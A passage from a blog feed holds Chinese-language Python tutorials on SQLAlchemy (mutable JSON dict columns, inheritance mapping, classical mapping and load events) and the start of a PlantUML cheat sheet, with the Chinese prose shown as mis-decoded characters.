        <content type="html"><![CDATA[<p>SqlAlchemyå¯¹åº”çš„æ•°æ®åº“çš„è¡¨ç»“æ„ï¼Œæ•°æ®åº“æ˜¯æ²¡æœ‰Dictå­—æ®µçš„ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡<code>json</code>æ¥å­˜å‚¨ã€‚</p><p>è€Œæƒ³è¦å°†å…¶åšæˆè‡ªåŠ¨å­˜å‚¨ï¼Œéœ€è¦ä½¿ç”¨<code>sqlalchemy.ext.mutable</code>æ¨¡å—ã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">sqlalchemy_type.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> json</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.types <span class="hljs-keyword">import</span> TypeDecorator, VARCHAR</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.mutable <span class="hljs-keyword">import</span> Mutable</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JSONEncodedDict</span>(<span class="hljs-params">TypeDecorator</span>):</span></span><span class="line">    <span class="hljs-string">&quot;Represents an immutable structure as a json-encoded string.&quot;</span></span><span class="line"></br></span><span class="line">    impl = VARCHAR</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_bind_param</span>(<span class="hljs-params">self, value, dialect</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:</span><span class="line">            value = json.dumps(value)</span><span class="line">        <span class="hljs-keyword">return</span> value</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_result_value</span>(<span class="hljs-params">self, value, dialect</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:</span><span class="line">            value = json.loads(value)</span><span class="line">        <span class="hljs-keyword">return</span> value</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MutableDict</span>(<span class="hljs-params">Mutable, <span class="hljs-built_in">dict</span></span>):</span></span><span class="line"><span class="hljs-meta">    @classmethod</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">coerce</span>(<span class="hljs-params">cls, key, value</span>):</span></span><span class="line">        <span class="hljs-string">&quot;Convert plain dictionaries to MutableDict.&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, MutableDict):</span><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">dict</span>):</span><span class="line">                <span class="hljs-keyword">return</span> MutableDict(value)</span><span class="line"></br></span><span class="line">            <span class="hljs-comment"># this call will raise ValueError</span></span><span class="line">            <span class="hljs-keyword">return</span> Mutable.coerce(key, value)</span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            <span class="hljs-keyword">return</span> value</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__setitem__</span>(<span class="hljs-params">self, key, value</span>):</span></span><span class="line">        <span class="hljs-string">&quot;&quot;&quot;æ•è·è®¾ç½®äº‹ä»¶ï¼Œå¹¶å°†è‡ªå·±è®¾ç½®ä¸ºå·²ä¿®æ”¹&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-built_in">dict</span>.__setitem__(self, key, value)</span><span class="line">        self.changed()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__delitem__</span>(<span class="hljs-params">self, key</span>):</span></span><span class="line">        <span class="hljs-string">&quot;&quot;&quot;æ•è·åˆ é™¤äº‹ä»¶ï¼Œå¹¶å°†è‡ªå·±è®¾ç½®ä¸ºå·²ä¿®æ”¹&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-built_in">dict</span>.__delitem__(self, key)</span><span class="line">        self.changed()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span></span><span class="line">        <span class="hljs-string">&quot;&quot;&quot;æ•è·updateäº‹ä»¶ï¼Œå¹¶å°†è‡ªå·±è®¾ç½®ä¸ºå·²ä¿®æ”¹&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-built_in">dict</span>.update(self, *args, **kwargs)</span><span class="line">        self.changed()</span></code></pre></div></div><p>ä½¿ç”¨ç»å…¸æ˜ å°„</p><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Table, Column, Integer</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy_type <span class="hljs-keyword">import</span> MutableDict, JSONEncodedDict</span><span class="line"></br></span><span class="line">my_data = Table(<span class="hljs-string">&#x27;my_data&#x27;</span>, metadata,</span><span class="line">    Column(<span class="hljs-string">&#x27;id&#x27;</span>, Integer, primary_key=<span class="hljs-literal">True</span>),</span><span class="line">    Column(<span class="hljs-string">&#x27;data&#x27;</span>, MutableDict.as_mutable(JSONEncodedDict))</span><span class="line">)</span></code></pre></div></div><p>æˆ–è€…ä½¿ç”¨å…³ç³»æ˜ å°„</p><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy_type <span class="hljs-keyword">import</span> MutableDict, JSONEncodedDict</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyDataClass</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;my_data&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    data = Column(MutableDict.as_mutable(JSONEncodedDict))</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqlalchemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sqlalchemy ç»§æ‰¿å…³ç³»è¡¨</title>
      <link href="/2021/11/12/python-sqlalchemy-%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E8%A1%A8/"/>
      <url>/2021/11/12/python-sqlalchemy-%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>é€šå¸¸ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ä¸€ä¸ªç±»æ¥è¡¨ç¤ºä¸€ä¸ªè¡¨ï¼Œè¿™ä¸ªç±»çš„å±æ€§å°±æ˜¯è¡¨ä¸­çš„å­—æ®µï¼Œè¿™ä¸ªç±»çš„æ–¹æ³•å°±æ˜¯è¡¨ä¸­çš„æ“ä½œã€‚</p><p>ä½†æ˜¯ç»§æ‰¿å…³ç³»çš„è¯ï¼Œæƒ³æŠŠç»§æ‰¿å…³ç³»æ”¾åˆ°è¡¨ä¸­å–è¡¨è¾¾å°±éœ€è¦ç‰¹æ®Šçš„æ–¹æ³•ã€‚</p><p>æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯å¯¹æ¯ä¸ªç±»éƒ½å®šä¹‰ä¸€ä¸ªè¡¨ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯å°†æ‰€æœ‰ç±»éƒ½æ”¾åˆ°ä¸€ä¸ªè¡¨ä¸­ã€‚</p><h2 id="å¯¹æ¯ä¸ªç±»éƒ½å®šä¹‰ä¸€ä¸ªè¡¨"><a href="#å¯¹æ¯ä¸ªç±»éƒ½å®šä¹‰ä¸€ä¸ªè¡¨" class="headerlink" title="å¯¹æ¯ä¸ªç±»éƒ½å®šä¹‰ä¸€ä¸ªè¡¨"></a>å¯¹æ¯ä¸ªç±»éƒ½å®šä¹‰ä¸€ä¸ªè¡¨</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, Integer, String, ForeignKey</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Item</span>(<span class="hljs-params">Base</span>):</span></span><span class="line"></br></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;item&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">50</span>))  <span class="hljs-comment"># formerly known as type</span></span><span class="line">    <span class="hljs-built_in">type</span> = Column(String(<span class="hljs-number">50</span>))</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;item&#x27;</span>,</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_on&#x27;</span>: <span class="hljs-built_in">type</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sword</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;sword&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, ForeignKey(<span class="hljs-string">&#x27;item.id&#x27;</span>), primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    durability = Column(Integer, default=<span class="hljs-number">100</span>)</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;Sword&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pistol</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;pistol&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, ForeignKey(<span class="hljs-string">&#x27;item.id&#x27;</span>), primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    ammo = Column(Integer, default=<span class="hljs-number">10</span>)</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;Pistol&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line"></br></span><span class="line">    engin = create_engine(<span class="hljs-string">&#x27;sqlite:///:memory:&#x27;</span>, echo=<span class="hljs-literal">False</span>)</span><span class="line">    session = sessionmaker(bind=engin)()</span><span class="line">    Base.metadata.create_all(engin)</span><span class="line"></br></span><span class="line">    sword = Sword(name=<span class="hljs-string">&#x27;S1&#x27;</span>, durability=<span class="hljs-number">100</span>)</span><span class="line">    pistol = Pistol(name=<span class="hljs-string">&#x27;P1&#x27;</span>, ammo=<span class="hljs-number">20</span>)</span><span class="line"></br></span><span class="line">    session.add(sword)</span><span class="line">    session.add(pistol)</span><span class="line">    session.commit()</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(session.query(Item).<span class="hljs-built_in">all</span>())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from item&#x27;</span>).fetchall())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from sword&#x27;</span>).fetchall())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from pistol&#x27;</span>).fetchall())</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Sword ======&quot;</span>)</span><span class="line">    s = session.query(Sword).first()  <span class="hljs-comment"># type: Sword</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.name: &quot;</span>, s.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.durability: &quot;</span>, s.durability)</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Pistol ======&quot;</span>)</span><span class="line">    p = session.query(Pistol).first()  <span class="hljs-comment"># type: Pistol</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.name: &quot;</span>, p.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.ammo: &quot;</span>, p.ammo)</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">[&lt;__main__.Sword object at 0x000001BB35CD0940&gt;, &lt;__main__.Pistol object at 0x000001BB35D16BB0&gt;]</span><span class="line">[(1, &#x27;S1&#x27;, &#x27;Sword&#x27;), (2, &#x27;P1&#x27;, &#x27;Pistol&#x27;)]</span><span class="line">[(1, 100)]</span><span class="line">[(2, 20)]</span><span class="line">====== Sword ======</span><span class="line">Sword.name:  S1</span><span class="line">Sword.durability:  100</span><span class="line">====== Pistol ======</span><span class="line">Pistol.name:  P1</span><span class="line">Pistol.ammo:  20</span></code></pre></div></div><h2 id="æ‰€æœ‰ç±»éƒ½åœ¨ä¸€ä¸ªè¡¨ä¸­"><a href="#æ‰€æœ‰ç±»éƒ½åœ¨ä¸€ä¸ªè¡¨ä¸­" class="headerlink" title="æ‰€æœ‰ç±»éƒ½åœ¨ä¸€ä¸ªè¡¨ä¸­"></a>æ‰€æœ‰ç±»éƒ½åœ¨ä¸€ä¸ªè¡¨ä¸­</h2><p>è¿™æ ·æœ‰ä¸€ä¸ªå¼Šç«¯ï¼Œå°±ä¼šå¯¼è‡´æ‰€æœ‰å­ç±»éƒ½ä¼šå…±äº«å…¶ä»–ä¹‹ç±»ç‰¹æœ‰å±æ€§</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, Integer, String</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Item</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    name = <span class="hljs-string">&#x27;unnamed item&#x27;</span></span><span class="line"></br></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;item&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    <span class="hljs-built_in">type</span> = Column(String(<span class="hljs-number">50</span>))</span><span class="line">    durability = Column(Integer, default=<span class="hljs-number">100</span>)</span><span class="line">    ammo = Column(Integer, default=<span class="hljs-number">10</span>)</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;item&#x27;</span>,</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_on&#x27;</span>: <span class="hljs-built_in">type</span></span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sword</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    name = <span class="hljs-string">&#x27;Sword&#x27;</span></span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;sword&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pistol</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    name = <span class="hljs-string">&#x27;Pistol&#x27;</span></span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;pistol&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///:memory:&#x27;</span>, echo=<span class="hljs-literal">False</span>)</span><span class="line">    session = sessionmaker(bind=engine)()</span><span class="line">    Base.metadata.create_all(engine)</span><span class="line"></br></span><span class="line">    sword = Sword(durability=<span class="hljs-number">20</span>)</span><span class="line">    pistol = Pistol(ammo=<span class="hljs-number">30</span>)</span><span class="line">    session.add(sword)</span><span class="line">    session.add(pistol)</span><span class="line">    session.commit()</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(session.query(Item).<span class="hljs-built_in">all</span>())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from item&#x27;</span>).fetchall())</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Sword ======&quot;</span>)</span><span class="line">    s = session.query(Sword).first()  <span class="hljs-comment"># type: Sword</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.name: &quot;</span>, s.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.durability: &quot;</span>, s.durability)</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Pistol ======&quot;</span>)</span><span class="line">    p = session.query(Pistol).first()  <span class="hljs-comment"># type: Pistol</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.name: &quot;</span>, p.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.ammo: &quot;</span>, p.ammo)</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">[&lt;__main__.Sword object at 0x000002DB20A0D0A0&gt;, &lt;__main__.Pistol object at 0x000002DB20A4D580&gt;]</span><span class="line">[(1, &#x27;sword&#x27;, 20, 10), (2, &#x27;pistol&#x27;, 100, 30)]</span><span class="line">====== Sword ======</span><span class="line">Sword.name:  Sword</span><span class="line">Sword.durability:  20</span><span class="line">====== Pistol ======</span><span class="line">Pistol.name:  Pistol</span><span class="line">Pistol.ammo:  30</span></code></pre></div></div><h2 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h2><ul><li><p><a href="https://stackoverflow.com/questions/38519349/how-to-use-sqlalchemy-with-class-attributes-and-properties/38526500#38526500">https://stackoverflow.com/questions/38519349/how-to-use-sqlalchemy-with-class-attributes-and-properties/38526500#38526500</a></p></li><li><p><a href="https://docs.sqlalchemy.org/en/14/orm/inheritance.html">https://docs.sqlalchemy.org/en/14/orm/inheritance.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqlalchemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python SqlAlchemy ORM</title>
      <link href="/2021/11/12/python-orm/"/>
      <url>/2021/11/12/python-orm/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯ORM"><a href="#ä»€ä¹ˆæ˜¯ORM" class="headerlink" title="ä»€ä¹ˆæ˜¯ORM"></a>ä»€ä¹ˆæ˜¯ORM</h2><p>ORMï¼ˆObject Relationship Mappingï¼‰æ˜¯ä¸€ç§å°†æ•°æ®åº“è¡¨å’Œå¯¹è±¡çš„å…³ç³»æ˜ å°„èµ·æ¥çš„æ–¹æ³•ã€‚æ˜¯å®Œæ•´è½¯ä»¶çš„å¿…è¦éƒ¨åˆ†ï¼Œå°†æ•°æ®æŒä¹…åŒ–ã€‚</p><p>æ˜ å°„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/11/12/python-orm/1.png"></p><p>å¸¸ç”¨çš„ORMæ¡†æ¶æ˜¯SqlAlchemyï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç®€å•æ¥å£ï¼Œæ— éœ€ä½¿ç”¨SQLè¯­å¥å°±å¯ä»¥å®Œæˆå¯¹æ•°æ®åº“çš„æ“ä½œã€‚</p><h2 id="ç»å…¸æ˜ å°„æ¨¡å¼"><a href="#ç»å…¸æ˜ å°„æ¨¡å¼" class="headerlink" title="ç»å…¸æ˜ å°„æ¨¡å¼"></a>ç»å…¸æ˜ å°„æ¨¡å¼</h2><p>ä½¿ç”¨ç»å…¸æ˜ å°„æ¨¡å¼ï¼Œæœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯å°†å¯¹è±¡å’Œè¡¨ä¹‹é—´çš„æ˜ å°„å…³ç³»è§£è€¦ï¼Œå°†æ•°æ®åº“çš„æ“ä½œæŠ½è±¡å‡ºæ¥ï¼Œæé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">model.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Device</span>:</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, device_id: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">        self.device_id: <span class="hljs-built_in">str</span> = device_id</span><span class="line">        self.hostname: <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span></span><span class="line">        self.version: <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> mapper, relationship</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> (</span><span class="line">    Table,</span><span class="line">    MetaData,</span><span class="line">    Column,</span><span class="line">    Integer,</span><span class="line">    String</span><span class="line">)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">import</span> model</span><span class="line"></br></span><span class="line">metadata = MetaData()</span><span class="line"></br></span><span class="line">devices = Table(</span><span class="line">    <span class="hljs-string">&#x27;devices&#x27;</span>,</span><span class="line">    metadata,</span><span class="line">    Column(<span class="hljs-string">&#x27;id&#x27;</span>, Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>),</span><span class="line">    Column(<span class="hljs-string">&#x27;device_id&#x27;</span>, String(<span class="hljs-number">255</span>), nullable=<span class="hljs-literal">False</span>),</span><span class="line">    Column(<span class="hljs-string">&#x27;hostname&#x27;</span>, String(<span class="hljs-number">255</span>)),</span><span class="line">    Column(<span class="hljs-string">&#x27;version&#x27;</span>, String(<span class="hljs-number">255</span>))</span><span class="line">)</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_mapper</span>():</span></span><span class="line">    mapper(model.Device, devices)</span></code></pre></div></div><h2 id="å…³ç³»æ˜ å°„æ¨¡å¼"><a href="#å…³ç³»æ˜ å°„æ¨¡å¼" class="headerlink" title="å…³ç³»æ˜ å°„æ¨¡å¼"></a>å…³ç³»æ˜ å°„æ¨¡å¼</h2><p>ä½¿ç”¨æ–¹æ³•å‚è€ƒ<a href="/2021/11/12/python-sqlalchemy-%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E8%A1%A8/" title="python sqlalchemy ç»§æ‰¿å…³ç³»è¡¨">python sqlalchemy ç»§æ‰¿å…³ç³»è¡¨</a></p><h2 id="ORMäº‹ä»¶"><a href="#ORMäº‹ä»¶" class="headerlink" title="ORMäº‹ä»¶"></a>ORMäº‹ä»¶</h2><p>å½“ORMä¸ç±»å±æ€§æ˜ å°„ä¸èƒ½åšåˆ°ä¸€ä¸€å¯¹åº”çš„æƒ…å†µä¸‹ï¼Œé‡æ–°è·å–ç±»æ—¶æ²¡æœ‰è¦†ç›–åˆ°çš„å±æ€§ä¸ä¼šè¢«åˆå§‹åŒ–ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨<code>load</code>äº‹ä»¶åœ¨åˆ›å»ºå®ä¾‹åç«‹å³å¯¹å±æ€§è¿›è¡Œåˆå§‹åŒ–ã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> event</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@event.listens_for(<span class="hljs-params">Device, <span class="hljs-string">&#x27;load&#x27;</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">receive_load</span>(<span class="hljs-params">target, _</span>):</span></span><span class="line">    target.uname = <span class="hljs-string">&#x27;uname&#x27;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PlantUML</title>
      <link href="/2021/11/03/PlantUML/"/>
      <url>/2021/11/03/PlantUML/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://plantuml.com/zh/deployment-diagram"><strong>æ‰€æœ‰å›¾ä¾‹æ±‡æ€»</strong></a></li></ul><h2 id="ç±»å›¾"><a href="#ç±»å›¾" class="headerlink" title="ç±»å›¾"></a>ç±»å›¾</h2><p><img src="/2021/11/03/PlantUML/1-1.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">abstract        æŠ½è±¡</span><span class="line">abstract class  æŠ½è±¡(ç­‰åŒabstract)</span><span class="line">annotation      æ³¨è§£</span><span class="line">circle          åœ†</span><span class="line">()              åœ†ç¼©å†™å½¢å¼</span><span class="line">class           ç±»</span><span class="line">diamond         è±å½¢</span><span class="line">&lt;&gt;              è±å½¢å†™å½¢å¼</span><span class="line">entity          å®ä¾‹</span><span class="line">enum            æšä¸¾</span><span class="line">interface       æ¥å£</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/1-2.png"></p><p>çº¿æ ‡è®°</p><ul><li><code>--|&gt;</code> ç»§æ‰¿</li><li><code>--*</code> ç»„åˆ</li><li><code>--o</code> èšåˆ</li></ul><p>æ–¹æ³•å’Œå±æ€§çš„è®¿é—®æ€§è´¨</p><ul><li><code>+</code> public</li><li><code>-</code> private</li><li><code>#</code> protected</li><li><code>~</code> package</li></ul><h3 id="è¾…åŠ©å¸ƒå±€"><a href="#è¾…åŠ©å¸ƒå±€" class="headerlink" title="è¾…åŠ©å¸ƒå±€"></a>è¾…åŠ©å¸ƒå±€</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line"></br></span><span class="line">class Bar1</span><span class="line">class Bar2</span><span class="line">together &#123;</span><span class="line">  class Together1</span><span class="line">  class Together2</span><span class="line">  class Together3</span><span class="line">&#125;</span><span class="line">Together1 - Together2</span><span class="line">Together2 - Together3</span><span class="line">Together2 -[hidden]--&gt; Bar1</span><span class="line">Bar1 -[hidden]&gt; Bar2</span><span class="line"></br></span><span class="line"></br></span><span class="line">@enduml</span></code></pre></div></div><p>åŠ 